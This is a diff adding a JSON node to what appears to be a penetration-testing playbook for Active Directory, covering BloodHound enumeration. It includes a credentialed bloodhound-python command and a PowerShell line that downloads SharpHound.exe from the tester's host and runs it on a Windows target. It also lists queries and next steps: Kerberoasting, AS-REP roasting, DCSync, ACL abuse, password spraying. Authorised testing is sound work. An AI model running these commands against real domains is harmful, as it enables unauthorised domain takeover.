@@ -1,0 +1,38 @@
+{
+  "id": "bloodhound",
+  "phase": "AD",
+  "title": "BloodHound",
+  "body": "Run this early and let it collect in the background. BloodHound will show you paths you'd never find manually. Shortest Path to DA is your first query.",
+  "cmd": "# bloodhound-python from Kali (no agent needed)\nbloodhound-python -u user -p 'pass' \\\n  -d domain.com -ns $ip -c All\n\n# Or SharpHound from Windows target\niwr http://$lhost/SharpHound.exe -OutFile C:\\Windows\\Temp\\sh.exe\n.\\sh.exe -c All --zipfilename bh.zip\n\n# Start BloodHound\nsudo neo4j start\nbloodhound\n\n# Key queries to run immediately:\n# 1. Shortest Path to Domain Admins\n# 2. Find AS-REP Roastable Users\n# 3. Find Kerberoastable Users\n# 4. Find Principals with DCSync Rights\n# 5. Computers Where Domain Users are Local Admin",
+  "warn": null,
+  "choices": [
+    {
+      "label": "Kerberoastable accounts found",
+      "next": "kerberoast"
+    },
+    {
+      "label": "AS-REP Roastable accounts found",
+      "next": "asrep_roast"
+    },
+    {
+      "label": "ACL abuse path found",
+      "next": "acl_abuse"
+    },
+    {
+      "label": "Delegation abuse path found",
+      "next": "delegation"
+    },
+    {
+      "label": "AD CS vulnerable templates",
+      "next": "adcs"
+    },
+    {
+      "label": "BloodHound found nothing useful",
+      "next": "ad_manual"
+    },
+    {
+      "label": "No direct path — password spray",
+      "next": "ad_spray"
+    }
+  ]
+}
